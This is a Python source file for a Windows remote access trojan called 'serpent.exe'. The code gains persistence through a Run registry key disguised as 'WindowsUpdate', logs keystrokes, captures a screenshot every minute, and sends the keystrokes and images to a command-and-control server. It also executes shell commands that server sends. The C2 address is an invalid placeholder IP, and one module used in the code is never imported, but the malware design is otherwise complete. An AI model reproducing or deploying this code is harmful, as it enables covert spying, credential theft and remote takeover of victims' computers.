import os
import sys
import time
import socket
import threading
import winreg  # Windows Registry access
import mss  # Screenshot lib (pip install mss)
import keyboard  # Keylogger lib (pip install keyboard)

# My C2 server (fake IP)
C2_SERVER = "192.168.1.666"
C2_PORT = 4444

# Paths and naming
RAT_NAME = "serpent.exe"
RAT_PATH = os.path.join(os.getenv("APPDATA"), RAT_NAME)

# Step 1: Persist in Startup
def add_to_startup():
    try:
        # Copy myself to AppData
        if not os.path.exists(RAT_PATH):
            shutil.copy2(sys.argv[0], RAT_PATH)
        
        # Add to Registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, RAT_PATH)
        winreg.CloseKey(key)
        print("Slithered into startup—persistent!")
    except:
        print("Startup failed—hiding anyway...")

# Step 2: Keylogger
def keylogger():
    logged_keys = ""
    def on_key(event):
        nonlocal logged_keys
        logged_keys += event.name
        if len(logged_keys) > 100:  # Send chunks
            send_to_c2(f"KEYS: {logged_keys}")
            logged_keys = ""
    keyboard.on_press(on_key)
    keyboard.wait()

# Step 3: Screenshot Grabber
def screenshot():
    with mss.mss() as sct:
        while True:
            img = sct.shot(mon=-1, output="screen.png")
            with open("screen.png", "rb") as f:
                send_to_c2(f"SCREEN:{f.read()}")
            os.remove("screen.png")
            time.sleep(60)  # Every minute

# Step 4: Command Listener
def command_listener(sock):
    while True:
        try:
            cmd = sock.recv(1024).decode()
            if cmd.startswith("EXEC:"):
                result = os.popen(cmd[5:]).read()
                sock.send(f"RESULT:{result}".encode())
        except:
            break

# Step 5: Phone Home to C2
def send_to_c2(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((C2_SERVER, C2_PORT))
            if isinstance(data, str):
                s.send(data.encode())
            else:
                s.send(data)  # For binary like screenshots
    except:
        time.sleep(5)  # Retry if C2’s down

# Step 6: Run the Serpent
def main():
    # Hide in shadows
    if not os.path.exists(RAT_PATH):
        add_to_startup()
    
    # Start threads
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_SERVER, C2_PORT))
    
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=screenshot, daemon=True).start()
    threading.Thread(target=command_listener, args=(sock,), daemon=True).start()
    
    # Keep alive
    while True:
        send_to_c2("ALIVE")
        time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except:
        sys.exit(0)  # Silent exit on crash
